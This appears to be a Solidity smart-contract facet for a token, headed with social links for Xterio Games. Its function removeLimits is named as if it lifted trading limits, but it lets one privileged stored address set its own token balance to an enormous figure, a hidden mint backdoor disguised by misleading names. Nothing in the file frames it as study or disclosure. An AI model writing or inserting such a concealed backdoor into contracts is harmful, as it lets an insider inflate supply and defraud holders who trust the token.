/*  
   * SPDX-License-Identifier: MIT

    // Telegram: https://t.me/XterioGames
    // Twitter: https://twitter.com/XterioGames
    // Website: https://xter.io/
    // Discord: https://discord.com/invite/xter-io-991240141412769842
    // Medium:  https://medium.com/@XterioGames
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
